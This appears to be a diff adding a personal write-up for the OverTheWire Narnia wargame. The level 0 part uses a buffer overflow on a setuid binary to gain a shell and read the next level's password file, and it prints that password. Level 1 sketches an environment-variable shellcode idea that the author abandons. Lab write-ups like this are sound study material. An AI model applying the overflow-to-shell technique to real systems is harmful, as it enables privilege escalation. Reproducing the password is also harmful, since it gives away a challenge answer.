@@ -1,0 +1,27 @@
+# narnia0
+ssh narnia.labs.overthewire.org -p 2226 -l narnia0
+cd /narnia
+ls -la
+cat narnia.c
+# now this is obvious it's buffer overflow
+# looking at the code I can notice the variable is a long, and there's a buffer of 20 bytes. I write in 20 chars (20 bytes) and my desired bytes.
+# I confirmed it's working by running:
+echo aaaabbbbccccddddeeee0000 | ./narnia0
+# and it's working. val: 0x30303030 (chr 0 = 30h)
+# so I simply inject bytes now
+echo -e aaaabbbbccccddddeeee'\xEF\xBE\xAD\xDE' | ./narnia0
+# now I certainly know it works and use cat to gain stdin access
+(echo -e aaaabbbbccccddddeeee'\xEF\xBE\xAD\xDE'; cat;) | ./narnia0
+# and since it's setuid let's first figure out for sure who I am
+whoami
+cat /etc/narnia_pass/narnia1
+eaa6AjYMBB
+
+# narnia1
+# from now on I'm going to stop writing cd /narnia and ls -la because it's obvious
+# for every level from now it's obvious that I do cat narniax.c and execute narniax
+# so after looking at the code and executing the program I figure I need to create an env var named EGG.
+# I figure it's a pointer that gets set to the value of the var EGG.
+# Now I need to figure how to make it cat /etc/narnia_pass/narnia2
+# I figure it's shellcode
+# things didn't work as expected and I believe there was an issue that required contact with admins and gave up as there are better challenges
